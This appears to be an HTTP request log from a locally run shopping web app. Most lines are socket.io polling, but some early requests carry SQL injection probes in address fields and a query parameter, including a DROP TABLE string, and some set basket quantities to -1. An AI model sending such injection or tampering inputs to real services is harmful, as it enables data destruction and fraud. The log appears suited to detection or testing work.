+deaa817fbb3c59f468dd4dd5,8e56293a547bf300,156,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 12, \x22BasketId\x22: 9, \x22quantity\x22: 3}",200,2025-12-03T00:18:17+0530
+11622ff260b0685118b144e9,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/60,HTTP/1.1,,200,2025-12-03T00:18:17+0530
+5b8b8461064bbbc57a36a7b1,73fad8bba5069bd4,11,127.0.0.1,GET,/rest/user/whoami,HTTP/1.1,,200,2025-12-03T00:18:18+0530
+9d98dcf6deebc10735a70f2e,afd4dfc890508305,317,127.0.0.1,PUT,/api/Addresss/66,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' OR '1'='1'-- Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:18:20+0530
+526c15ec3959a5156e6f88e0,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 294\x22, \x22cardNum\x22: \x224408475547795829\x22, \x22expMonth\x22: 2, \x22expYear\x22: 2030}",400,2025-12-03T00:18:21+0530
+b361ef58a316f78137b16de3,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 3, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,2025-12-03T00:18:23+0530
+59817614981ee8b76e86c63d,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/61,HTTP/1.1,,200,2025-12-03T00:18:23+0530
+90614a11f702db077242036b,e0b7cc339ffdc6bb,444,127.0.0.1,GET,/api/SecurityQuestions,HTTP/1.1,,200,2025-12-03T00:18:24+0530
+8941175c257cfecf04b75108,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWP9a9&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:18:25+0530
+8749013e69a133b4022bf364,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWPFhP&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:18:25+0530
+08bd35ec2526f5b1dad4a221,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 2, \x22BasketId\x22: 9, \x22quantity\x22: 3}",200,2025-12-03T00:18:25+0530
+140e8644b74211988f37562d,bc466f600626b8a9,156,127.0.0.1,PUT,/api/BasketItems/62,HTTP/1.1,{\x22quantity\x22: -1},200,2025-12-03T00:18:25+0530
+b9abb5a95750083f2f11a213,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/62,HTTP/1.1,,200,2025-12-03T00:18:27+0530
+f5307309d5ccadf0793d02fb,39ff7855035974aa,30,127.0.0.1,GET,/api/Cards,HTTP/1.1,,200,2025-12-03T00:18:29+0530
+6dd123b90cd304414472e640,afd4dfc890508305,318,127.0.0.1,PUT,/api/Addresss/66,HTTP/1.1,"{\x22streetAddress\x22: \x22789 '; DROP TABLE u Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:18:31+0530
+eee03921f2fbc74788759588,8e56293a547bf300,156,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 32, \x22BasketId\x22: 9, \x22quantity\x22: 3}",200,2025-12-03T00:18:32+0530
+b1ff416544bce9f467c1c33d,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/63,HTTP/1.1,,200,2025-12-03T00:18:32+0530
+7ab27e42c35e2ace216611ff,51329bcc1ed52817,548,127.0.0.1,GET,/api/Quantitys,HTTP/1.1,,200,2025-12-03T00:18:34+0530
+b0a170641a339cb43e0be38f,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 64\x22, \x22cardNum\x22: \x224500797027375711\x22, \x22expMonth\x22: 6, \x22expYear\x22: 2029}",400,2025-12-03T00:18:36+0530
+5719f861543ef7dbc38e766e,afd4dfc890508305,311,127.0.0.1,PUT,/api/Addresss/66,HTTP/1.1,"{\x22streetAddress\x22: \x22789 admin'-- Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:18:37+0530
+7cf2c9be811a25e5e29c6d92,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 2, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,2025-12-03T00:18:38+0530
+ce0e33578902160d360080a4,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/64,HTTP/1.1,,200,2025-12-03T00:18:38+0530
+8c4e9aaaaa8e3ec912a58df4,5585bb50c9472de2,336,127.0.0.1,GET,/rest/track-order/,HTTP/1.1,,500,2025-12-03T00:18:39+0530
+b5137d84409493fd1c75edb7,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 2, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,2025-12-03T00:18:41+0530
+670fe5f634dfcf66f4d06e2d,bc466f600626b8a9,156,127.0.0.1,PUT,/api/BasketItems/65,HTTP/1.1,{\x22quantity\x22: -1},200,2025-12-03T00:18:41+0530
+af10255b10e08d89170c7441,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/65,HTTP/1.1,,200,2025-12-03T00:18:42+0530
+8a730a4d22b7c6570da76b88,3363f004671bc07b,35,127.0.0.1,GET,/api/Products/10?test=%27%20OR%201%3D1--,HTTP/1.1,,404,2025-12-03T00:18:44+0530
+db00219bdc6940052f2f6edc,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 310\x22, \x22cardNum\x22: \x224272184705488806\x22, \x22expMonth\x22: 11, \x22expYear\x22: 2030}",400,2025-12-03T00:18:46+0530
+3de3821653d7036d70587f82,d15e0519eeded2db,284,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22Test User 3\x22, \x22mobileNum\x22: \x224312157045\x22, \x22zipCode\x22: \x2216134\x22, \x22streetAddress\x22: \x22763 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,2025-12-03T00:18:47+0530
+a1b63752b0acfedb48958a12,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 874\x22, \x22cardNum\x22: \x224630245345219406\x22, \x22expMonth\x22: 7, \x22expYear\x22: 2028}",400,2025-12-03T00:18:47+0530
+0decfbd31a2edf12ab8201cf,8e56293a547bf300,156,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 31, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,2025-12-03T00:18:47+0530
+7ce6c717f0f6364faa30cb27,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWPFk6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:18:50+0530
+a23d3e6919cb2e5b9dc294e2,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWPLoX&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:18:50+0530
+bd70d9905c5ede188a061726,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWPLof&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:19:15+0530
+7745cf01e19e80fb2c79e2f3,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWPRwW&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:19:15+0530
+3926fa2d794172b9310c2c3d,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWPR--&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:19:40+0530
+6a7a67c9b6b16183acc257c5,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWPY5M&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:19:40+0530
+6a263e738961e27b17728600,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWPY5P&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:20:05+0530
+d44bd772b497179f034ab7d7,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWPeC8&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:20:05+0530
+13536541fd537e61636e8d1f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWPeCB&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:20:30+0530
+d0343ec471a182d1ca4d3ef7,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWPkJ3&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:20:31+0530
+9883627f38a9a31b45274feb,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWPkLJ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:20:56+0530
+10105ef433117372cc5d41e5,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWPqSL&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:20:56+0530
+53bb676117f6e83bc6caaa6c,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWPqSQ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:21:21+0530
+dd9f646f6598c7f08ae8d862,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWPwZ6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:21:21+0530
+697200e6345dbff5e84461a6,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWPwZ8&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:21:46+0530
+4b4f4edfd5c02813ce460942,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWQ0g1&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:21:46+0530
+33e58ad5348c7c57aeda2694,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWQ0g4&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:22:11+0530
+060422caa8a2d8ee7d22a1ab,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWQ6nJ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:22:11+0530
+6281bddb70abc8aeefd5b85d,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWQ6nO&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:22:36+0530
+6cbb140dbd75cdaf74a8a69c,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWQCvU&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:22:36+0530
+4362000f74b8f7cabc924e03,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWQCvY&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:23:01+0530
+94aacf01c1024fa7840c2100,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWQJ0M&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:23:01+0530
+27b03ce78773900917348561,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWQJ0P&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:23:26+0530
+0f2c97b6b633fa9f278cbfe8,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWQP7C&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:23:26+0530
+11d6f7b7152ae0d6adfc2a34,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWQP7E&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:23:51+0530
+d2d5b541ca09c37fb32fabd6,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWQVDv&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:23:51+0530
+db33d6f7546ea6b777740c66,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWQVDz&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:24:16+0530
+de1fc0ef2f7439798ff0e584,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWQbKY&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:24:16+0530
+d721301ab73647fb07ee9cde,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWQbKd&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:24:41+0530
+0bfdecc45a8dd3d8897d1b71,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWQhRq&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:24:41+0530
+ab8fe9463d0d051e3cd724c1,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWQhRs&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:25:06+0530
+6d3ef99e0ddcc7c6d1b4e5db,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWQnYR&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:25:06+0530
+0efa39ec031adc91962dbb03,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWQnYb&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:25:31+0530
+8586915f9816c7663d5fab65,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWQtfF&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:25:31+0530
+b8d80c4ba79b4d7deb39eab8,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWQtfI&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:25:56+0530
+f58bdcec29e7549c922dca4b,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWQzmI&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:25:56+0530
+e53588058f5f9da80dd7cb4f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWQzmb&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:26:21+0530
+caf0e8d333c1407c3e136c7f,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWR3tS&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:26:21+0530
+3e06cb869d17f4968eed77a8,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWR3to&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:26:46+0530
+ba35d14ff4269f78b85ebb92,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWR9-H&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:26:46+0530
+5458687cea5ffb65a974e50f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWR9-K&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:27:11+0530
+73b1ead83b418f9f482da858,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWRG4x&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:27:11+0530
+15c9d6dc1ee6c73d50580db6,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWRG4z&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:27:36+0530
+bb9764a2bb474b8a8080979a,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWRMBW&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:27:36+0530
+2154aa596ed9bfa82f08481f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWRMC2&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:28:01+0530
+0ba3ce7a5a9a46f27c20db61,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWRSIG&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:28:01+0530
+91e33588c0268d3cd926ec7e,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWRSIJ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:28:26+0530
+bdfd204e27840fe81bf7625d,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWRYPM&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:28:26+0530
+b00e3da2bd786787710f3ba8,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWRYPQ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:28:51+0530
+e10aa21128e74d4923972d8c,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWReWK&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:28:51+0530
+dc9dccbbcabb968d08cfa56b,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWReWM&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:29:16+0530
+4829bda1553a0eb695506830,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWRkd6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:29:16+0530
+bbf69a04f837cee9b262ab28,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWRkdD&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:29:41+0530
+ad41a11df6a2d908a6b99d90,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWRqkn&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:29:41+0530
+84e3c0a5f0485d27d692e930,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWRqko&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:30:06+0530
+813f5992ccda9e189e058945,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWRwqT&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:30:06+0530
+30050f80086d2d91f3fc2d51,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWRwqV&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:30:31+0530
+64dcdd05a42b3fe9c70244fb,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWS0yk&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:30:31+0530
+a4724272822a8a13498620e1,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWS0yo&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:30:56+0530
+3b580ad062b23d4298f35890,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWS73r&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:30:56+0530
+23713be9c021265544f04472,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWS73x&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:31:21+0530
+b639cc864745fcb2fc9ec454,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWSDAu&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:31:21+0530
+a2e678e67d8ce7c82e883921,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWSDAx&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:31:46+0530
+a16fb911e7608e415fdf9969,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWSJI2&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:31:46+0530
+83f74c4aeacca03e9fbf2136,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWSJI9&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:32:11+0530
+9a5677fbb1c9a1e920023144,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWSPPv&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:32:11+0530
+5c55adf6b02c32b71a0dba9f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWSPQX&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:32:36+0530
+30f2828a69be30a45ee2164c,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWSVWq&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:32:36+0530
+96bdd3c95f9d0396dfaac867,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWSVWu&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:33:01+0530
+74df2014081eefa7ffd70f69,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWSb_b&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:33:03+0530
+82c916797ee5c0c65ff41ae1,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWSb_p&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:33:28+0530
+f9b642aa62f6dfecbc1cc58e,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWSi6r&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:33:28+0530
+bfc36e6820062893929e4b54,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWSi6u&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:33:53+0530
+e7c7d0e1ce5968ac60f90f0d,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWSoED&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:33:53+0530
+818aa4a7698c0b5550c141c2,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWSoEH&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:34:18+0530
+3152047a724d1baee1d0c75e,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWSuKz&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:34:18+0530
+311d0edfea3fa7173eebb626,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWSuL9&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:34:43+0530
+132e2b865bfeac57c49b12b7,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWS-au&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:34:44+0530
+f7f37b067b7498b0789786ef,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWS-ax&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:35:09+0530
+1238e0c5f32d155619ee5dc2,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWT4iM&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:35:09+0530
+a267897ee39ac81d36003faf,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWT4iT&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:35:34+0530
+f9c0fbe0f0249f1d29283a6d,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWTAuF&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:35:34+0530
+1055d1ec76cdb237505715aa,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWTAuI&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:35:59+0530
+ab87adb0f329ff176dad520a,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWTG_6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:35:59+0530
+31e4b457e9c532401b582502,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWTG_9&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:36:24+0530
+6363587567e99a2987ccf3b9,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWTN72&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:36:24+0530
+5bd3d2bf4126b72abedd509f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWTN79&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:36:49+0530
+44871330475c22eea8747d5c,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWTTEa&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:36:49+0530
+b30858f1ddb3c36a7e975418,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWTTEf&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:37:14+0530
+07686d6076223514a771f8c3,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWTZLn&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:37:14+0530
+139cb61a18b0b87050009d83,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWTZLs&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:37:39+0530
+14b0ddd12a48eafed103c9d7,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWTfTC&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:37:39+0530
+b7b29a947c9e319e2183380b,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWTfTG&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:38:04+0530
